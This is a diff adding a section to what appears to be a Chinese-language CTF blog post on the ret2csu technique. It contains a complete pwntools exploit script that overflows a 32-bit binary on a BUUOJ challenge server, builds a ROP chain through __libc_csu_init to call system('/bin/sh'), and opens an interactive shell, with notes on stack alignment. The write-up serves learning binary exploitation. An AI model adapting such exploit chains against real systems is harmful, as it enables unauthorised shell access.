@@ -308,6 +308,69 @@ p.sendafter('Hello, World\n', payload3)
 p.interactive()                   # 进入交互模式
 ```
 
+其实由于版本的更新，这个特殊的函数也发生了变化。
+
+![image-20260325210208827](/images/image-20260325210208827.png)
+
+以下为近期遇到的题目的payload，可供参考。
+
+```
+from pwn import *
+
+context(os='linux', arch='i386', log_level='debug')
+p = remote('node5.buuoj.cn',28254)
+
+libc_csu_init_end = 0x08048518  # pop ebx; esi; edi; ebp; ret
+libc_csu_init_call = 0x080484F8 # loc_80484F8: 这里的 push 逻辑
+
+system_got_ptr = 0x0804a010     
+bin_sh_addr = 0x0804a024       
+
+# 计算 EBX: 指令是 call [ebx + edi*4 - 0xf8]
+# 设 edi=0, 则 ebx = system_got_ptr + 0xf8
+target_ebx = system_got_ptr + 0xf8
+
+# 偏移量 0x88 + 4 = 140
+payload = b'a' * 140
+
+# --- 阶段 1: 填入寄存器 ---
+payload += p32(libc_csu_init_end)
+payload += p32(target_ebx)       # ebx -> 配合 edi 寻址到 system_got
+payload += p32(1)                # esi -> 计数器，运行一次后退出
+payload += p32(0)                # edi -> 索引 0
+payload += p32(bin_sh_addr)      # ebp -> 对应指令 push ebp，即 system 的参数
+
+# --- 阶段 2: 回到 csu 中间的 call 逻辑 ---
+payload += p32(libc_csu_init_call)
+
+# --- 阶段 3: 核心对齐填充 (重点!) ---
+# 此时程序执行了 3 次 push，esp 减小了 12 字节。
+# 紧接着执行 call，call 会再压入 4 字节返回地址。
+# 所以我们需要在 payload 里补齐数据，使得 system 运行时能看到参数。
+payload += p32(0x08048360)       # 对应 [esp+24h] 处的数据占位
+payload += p32(bin_sh_addr)      # 关键：这个值会被 [esp+24h] 偏移取到压入栈
+payload += p32(0xdeadbeef)       # 填充占位
+payload += b'B' * 4              # 补齐到 16 字节，对应 add esp, 10h
+
+# --- 阶段 4: 退出循环后的 pop 平衡 ---
+payload += p32(0) * 4            # 弹出 ebx, esi, edi, ebp
+payload += p32(0x08048360)       # 最后的返回地址 (回到 main)
+
+p.recvuntil("Input:\n")
+p.sendline(payload)
+p.interactive()
+```
+
+这边是在程序存在system函数和/binsh参数的情况下，利用ret2cus传参的代码，关键难点在于这个对齐，只要一不对齐，代码就段错误失败。
+
+以上仅供参考。
+
+
+
+
+
+
+
 
 
 ----
